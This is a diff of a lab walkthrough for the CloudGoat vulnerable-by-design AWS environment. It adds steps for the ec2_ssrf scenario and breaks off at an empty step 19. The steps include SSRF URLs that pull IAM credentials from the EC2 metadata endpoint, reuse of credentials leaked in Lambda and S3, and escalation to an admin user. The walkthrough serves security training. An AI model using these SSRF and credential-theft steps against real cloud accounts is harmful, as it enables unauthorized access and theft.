@@ -231,14 +231,71 @@ cat cardholder/card
 1. Remove the cardholder folder   
 `rm -rf cardholder`  
 2. Remove the scenario  
-`./cloudgoat destroy cloud_breach_s3`  
+`./cloudgoat destroy cloud_breach_s3 --profile goat` 
 3. Remove AWS CLI Credentials for wrole  
 
 
 ## ec2_ssrf
+**Scenario Goal: Invoke the "cg-lambda-[CG-ID]" Lambda function**
 1. Create scenario  
 `./cloudgoat.py create ec2_ssrf --profile goat`  
-
+2. Document the output and create a profile for solus
+`aws configure --profile solus`    
+    * AWS Access Key ID: __solus aws_access_key_id__   
+    * AWS Secret Access Key: __solus aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__  
+3.  Attempt to list the lamda functions 
+`aws lambda list-functions --profile solus`   
+The listed function contains a service role as well as an ec2 access key id and secret key id
+4. Create a new profile called ec2 with the discovered credentials
+`aws configure --profile ec2`    
+    * AWS Access Key ID: __ec2 aws_access_key_id__   
+    * AWS Secret Access Key: __ec2 aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__  
+5. Now that we have EC2 permissions, lets describe EC2 instances
+`aws ec2 describe-instances --profile ec2`
+6. Locate the public IP and navigate to it
+Type error Received, but maybe it's useful
+7. Navigate to the public IP + the URI of one of the listed javascript files
+`http://<publicURL/?url=http://<publicURL>/node_modules/express/lib/router/index.js`
+Result is the portion of a page called "sethsec's SSRF demo"
+8. Attempt to access metadata via the URL SSRF *feature*
+`http://<publicURL/?url=http://169.254.169.254/latest/meta-data`
+9. What a helpful app, attempt discover any security-credentials which may be accessible
+`http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+10. Navigate to the resuting role name
+`http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
+11. Document the new credentials and create a new AWS CLI profile
+`aws configure --profile cg` 
+    * AWS Access Key ID: __cg-ec2-role aws_access_key_id__   
+    * AWS Secret Access Key: __cg-ec2-role aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__ 
+12. Edit the AWS Credentials file to add the session token  
+`vim ~/.aws/credentials`  
+`:set paste` Enter  
+`i` navigate to the end of the last line then add the session token  
+`aws_session_token = <token>`ESC  
+`:wq` Enter   
+13. Attempt enumeration of the new profile permissions     
+The cg profile doesn't appear to have permmissions for viewing lambda/ec2/iam resources    
+14. Attempt to list S3 buckets   
+`aws s3 ls --profile cg`   
+15. Look for useful information in the secret bucket    
+`aws s3 ls s3://<cg-secret-s3-bucket-x> --profile cg`    
+16. Copy the file to your current directory    
+`aws s3 cp s3://<cg-secret-s3-bucket-x/admin-user.txt ./`
+17. Read the file    
+`cat admin-user.txt`
+18. Create a new profile with the admin-user credentials
+`aws configure --profile admin`
+    * AWS Access Key ID: __admin-user aws_access_key_id__   
+    * AWS Secret Access Key: __admin-user aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__ 
+19. 
 
 ## rce_web_app
 1. Create scenario   
